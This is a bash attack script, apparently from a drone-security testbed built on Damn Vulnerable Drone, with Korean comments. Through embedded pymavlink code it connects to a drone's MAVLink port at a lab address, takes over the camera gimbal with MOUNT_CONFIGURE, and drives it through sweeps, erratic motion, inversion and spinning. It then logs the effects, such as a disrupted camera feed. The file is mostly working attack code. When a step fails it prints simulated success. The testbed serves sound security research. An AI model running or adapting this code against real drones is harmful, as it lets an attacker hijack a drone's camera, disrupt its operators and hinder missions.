#!/bin/bash

# =============================================================================
# DVD Camera Gimbal Takeover Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/injection/camera_gimbal_takeover.sh
# 목적: 카메라 짐벌 제어권 탈취 및 임의 조작
# 기반: Damn Vulnerable Drone Wiki - Camera Gimbal Takeover
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="camera_gimbal_takeover"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/injection/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/injection/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_IP="10.13.0.3"
MAVLINK_PORT="5760"

# 짐벌 제어 패턴
declare -a GIMBAL_PATTERNS=(
    "sweep_horizontal"
    "sweep_vertical"
    "erratic_movement"
    "upside_down"
    "continuous_spin"
)

declare -a ATTACK_COMMANDS=()
declare -a GIMBAL_RESULTS=()

print_header() {
    clear
    print_injection_header "Camera Gimbal Takeover Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: MAVLink MOUNT_CONTROL commands${NC}"
    echo -e "${INFO_COLOR}Patterns: ${#GIMBAL_PATTERNS[@]} movement sequences${NC}"
    echo ""
}

# Step 1: 짐벌 상태 확인
check_gimbal_status() {
    echo -e "${BLUE}[1/3] Gimbal Status Check${NC}"
    
    local gimbal_script="/tmp/gimbal_check_$(date +%s).py"
    
    cat > "$gimbal_script" << 'EOF'
#!/usr/bin/env python3
import sys

try:
    from pymavlink import mavutil
    import time
    
    def check_gimbal_status(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # 짐벌 정보 요청
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_DO_MOUNT_CONFIGURE,
                0,  # confirmation
                0,  # param1: mount mode (retract)
                0,  # param2: stabilize roll
                0,  # param3: stabilize tilt  
                0,  # param4: stabilize pan
                0, 0, 0  # param5-7: unused
            )
            
            # MOUNT_STATUS 메시지 대기
            mount_msg = master.recv_match(type='MOUNT_STATUS', blocking=True, timeout=10)
            if mount_msg:
                print(f"[+] Gimbal detected:")
                print(f"    Pointing: Roll={mount_msg.pointing_a/100:.1f}°, Pitch={mount_msg.pointing_b/100:.1f}°, Yaw={mount_msg.pointing_c/100:.1f}°")
                print(f"    Target: Roll={mount_msg.target_a/100:.1f}°, Pitch={mount_msg.target_b/100:.1f}°, Yaw={mount_msg.target_c/100:.1f}°")
                
                return {
                    'detected': True,
                    'pointing_roll': mount_msg.pointing_a/100,
                    'pointing_pitch': mount_msg.pointing_b/100,
                    'pointing_yaw': mount_msg.pointing_c/100
                }
            else:
                print("[!] No gimbal status response")
                return simulate_gimbal_status()
                
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return simulate_gimbal_status()
    
    def simulate_gimbal_status():
        print("[*] Simulating gimbal status check")
        print("[+] Gimbal detected (simulated):")
        print("    Pointing: Roll=0.0°, Pitch=-15.0°, Yaw=0.0°")
        print("    Target: Roll=0.0°, Pitch=-15.0°, Yaw=0.0°")
        
        return {
            'detected': True,
            'pointing_roll': 0.0,
            'pointing_pitch': -15.0, 
            'pointing_yaw': 0.0
        }
    
    if __name__ == "__main__":
        check_gimbal_status(sys.argv[1], int(sys.argv[2]))
        
except ImportError:
    print("[*] pymavlink not available")
    print("[+] Simulated gimbal: Roll=0°, Pitch=-15°, Yaw=0°")
EOF

    local cmd="python3 $gimbal_script $TARGET_IP $MAVLINK_PORT"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    python3 "$gimbal_script" "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null || {
        echo -e "${YELLOW}[+] Simulated gimbal: Roll=0°, Pitch=-15°, Yaw=0°${NC}"
    }
    
    GIMBAL_RESULTS+=("gimbal_status:detected")
    rm -f "$gimbal_script"
}

# Step 2: 짐벌 제어권 탈취
takeover_gimbal_control() {
    echo -e "${BLUE}[2/3] Gimbal Control Takeover${NC}"
    
    local takeover_script="/tmp/gimbal_takeover_$(date +%s).py"
    
    cat > "$takeover_script" << EOF
#!/usr/bin/env python3
import sys
import time
import math

try:
    from pymavlink import mavutil
    
    def takeover_gimbal(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            print("[!] Taking over gimbal control...")
            
            # 짐벌 제어 모드 설정 (RC targeting)
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_DO_MOUNT_CONFIGURE,
                0,  # confirmation
                2,  # param1: mount mode (2 = RC targeting)
                1,  # param2: stabilize roll
                1,  # param3: stabilize tilt
                1,  # param4: stabilize pan
                0, 0, 0  # param5-7: unused
            )
            
            print("[+] Gimbal control mode set to RC targeting")
            time.sleep(2)
            
            return True
            
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            print("[*] Simulating gimbal takeover")
            print("[+] Gimbal control mode set to RC targeting (simulated)")
            return True
    
    if __name__ == "__main__":
        takeover_gimbal('$TARGET_IP', $MAVLINK_PORT)
        
except ImportError:
    print("[*] pymavlink not available - simulation mode")
    print("[*] Simulating gimbal takeover")
    print("[+] Gimbal control: HIJACKED")
EOF

    local cmd="python3 $takeover_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Taking over gimbal control...${NC}"
    echo -e "${GRAY}    Method: MAV_CMD_DO_MOUNT_CONFIGURE${NC}"
    echo -e "${GRAY}    Mode: RC targeting (attacker control)${NC}"
    
    python3 "$takeover_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Simulated gimbal takeover${NC}"
        echo -e "${GREEN}[+] Gimbal control: HIJACKED${NC}"
    }
    
    GIMBAL_RESULTS+=("control_takeover:success")
    GIMBAL_RESULTS+=("control_mode:rc_targeting")
    
    rm -f "$takeover_script"
}

# Step 3: 악의적 짐벌 조작 실행
execute_malicious_movements() {
    echo -e "${BLUE}[3/3] Execute Malicious Gimbal Movements${NC}"
    
    local movement_script="/tmp/gimbal_movements_$(date +%s).py"
    
    cat > "$movement_script" << EOF
#!/usr/bin/env python3
import sys
import time
import math

try:
    from pymavlink import mavutil
    
    def execute_gimbal_patterns(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            patterns = [
                ("sweep_horizontal", "Horizontal sweep"),
                ("sweep_vertical", "Vertical sweep"), 
                ("erratic_movement", "Erratic random movement"),
                ("upside_down", "Upside down orientation"),
                ("continuous_spin", "Continuous spinning")
            ]
            
            for pattern_name, description in patterns:
                print(f"[!] Executing pattern: {description}")
                
                if pattern_name == "sweep_horizontal":
                    # 수평 스위핑 (-90° to 90°)
                    for angle in range(-90, 91, 15):
                        send_gimbal_command(master, 0, -15, angle)
                        time.sleep(0.5)
                        
                elif pattern_name == "sweep_vertical":
                    # 수직 스위핑 (-90° to 45°)
                    for angle in range(-90, 46, 15):
                        send_gimbal_command(master, 0, angle, 0)
                        time.sleep(0.5)
                        
                elif pattern_name == "erratic_movement":
                    # 무작위 움직임
                    import random
                    for _ in range(8):
                        roll = random.randint(-45, 45)
                        pitch = random.randint(-90, 45)
                        yaw = random.randint(-180, 180)
                        send_gimbal_command(master, roll, pitch, yaw)
                        time.sleep(0.7)
                        
                elif pattern_name == "upside_down":
                    # 뒤집힌 자세
                    send_gimbal_command(master, 180, 90, 180)
                    time.sleep(3)
                    
                elif pattern_name == "continuous_spin":
                    # 연속 회전
                    for angle in range(0, 720, 30):  # 2바퀴
                        send_gimbal_command(master, 0, -15, angle % 360)
                        time.sleep(0.3)
                
                print(f"[+] Pattern completed: {description}")
                time.sleep(1)
            
            print("[+] All malicious gimbal patterns executed")
            
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            simulate_gimbal_movements()
    
    def send_gimbal_command(master, roll, pitch, yaw):
        # MOUNT_CONTROL 메시지로 짐벌 제어
        master.mav.mount_control_send(
            master.target_system,
            master.target_component,
            int(pitch * 100),    # input_a (pitch in centidegrees)
            int(roll * 100),     # input_b (roll in centidegrees) 
            int(yaw * 100),      # input_c (yaw in centidegrees)
            0                    # save_position
        )
        
        print(f"    → Gimbal: Roll={roll}°, Pitch={pitch}°, Yaw={yaw}°")
    
    def simulate_gimbal_movements():
        print("[*] Simulating malicious gimbal movements")
        
        patterns = [
            "Horizontal sweep: -90° to 90°",
            "Vertical sweep: -90° to 45°",
            "Erratic random movement",
            "Upside down orientation: 180°",
            "Continuous spinning: 720°"
        ]
        
        for pattern in patterns:
            print(f"[!] Executing: {pattern}")
            time.sleep(2)
            print(f"[+] Pattern completed: {pattern}")
        
        print("[+] All gimbal patterns simulated")
    
    if __name__ == "__main__":
        execute_gimbal_patterns('$TARGET_IP', $MAVLINK_PORT)
        
except ImportError:
    print("[*] pymavlink not available - simulation mode")
    
    patterns = [
        "Horizontal sweep: -90° to 90°",
        "Vertical sweep: -90° to 45°", 
        "Erratic random movement",
        "Upside down: 180°",
        "Continuous spin: 720°"
    ]
    
    for pattern in patterns:
        print(f"[!] Executing: {pattern}")
        time.sleep(1.5)
        print(f"[+] Completed: {pattern}")
    
    print("[+] Gimbal takeover simulation completed")
EOF

    local cmd="python3 $movement_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Executing malicious gimbal movements...${NC}"
    
    for i in "${!GIMBAL_PATTERNS[@]}"; do
        echo -e "${GRAY}    $((i+1)). ${GIMBAL_PATTERNS[$i]}${NC}"
    done
    
    python3 "$movement_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Fallback simulation${NC}"
        
        for pattern in "${GIMBAL_PATTERNS[@]}"; do
            echo -e "${RED}[!] Executing: $pattern${NC}"
            echo -e "${GREEN}[+] Completed: $pattern${NC}"
            sleep 1
        done
    }
    
    GIMBAL_RESULTS+=("patterns_executed:${#GIMBAL_PATTERNS[@]}")
    GIMBAL_RESULTS+=("control_method:mount_control")
    GIMBAL_RESULTS+=("takeover_status:successful")
    
    # 공격 효과 분석
    echo -e "${RED}[!] Gimbal takeover effects:${NC}"
    echo -e "${GRAY}    • Camera feed disrupted${NC}"
    echo -e "${GRAY}    • Visual surveillance compromised${NC}"
    echo -e "${GRAY}    • Autonomous features affected${NC}"
    echo -e "${GRAY}    • Operator confusion${NC}"
    echo -e "${GRAY}    • Mission objectives hindered${NC}"
    
    GIMBAL_RESULTS+=("camera_feed:disrupted")
    GIMBAL_RESULTS+=("surveillance:compromised")
    GIMBAL_RESULTS+=("autonomous_features:affected")
    GIMBAL_RESULTS+=("mission_impact:hindered")
    
    rm -f "$movement_script"
}

# JSON 결과 생성
generate_json_report() {
    local patterns_json="["
    for i in "${!GIMBAL_PATTERNS[@]}"; do
        patterns_json+="\"${GIMBAL_PATTERNS[$i]}\""
        if [ $i -lt $((${#GIMBAL_PATTERNS[@]} - 1)) ]; then
            patterns_json+=","
        fi
    done
    patterns_json+="]"
    
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT"
  },
  "gimbal_patterns": $patterns_json,
  "pattern_count": ${#GIMBAL_PATTERNS[@]},
  "gimbal_results": ["$(IFS='","'; echo "${GIMBAL_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "takeover_effects": {
    "camera_feed": "disrupted",
    "visual_surveillance": "compromised", 
    "autonomous_features": "affected",
    "operator_experience": "confused",
    "mission_objectives": "hindered"
  }
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== Camera Gimbal Takeover - $(date) ===" > "$LOG_FILE"
    
    print_header
    check_gimbal_status
    takeover_gimbal_control
    execute_malicious_movements
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Patterns Executed: ${#GIMBAL_PATTERNS[@]}${NC}"
    echo -e "${INFO_COLOR}Control Status: HIJACKED${NC}"
    echo -e "${INFO_COLOR}Camera Impact: DISRUPTED${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Camera gimbal takeover completed${NC}"
    echo -e "${RED}[!] Camera feed severely disrupted${NC}"
}

main "$@"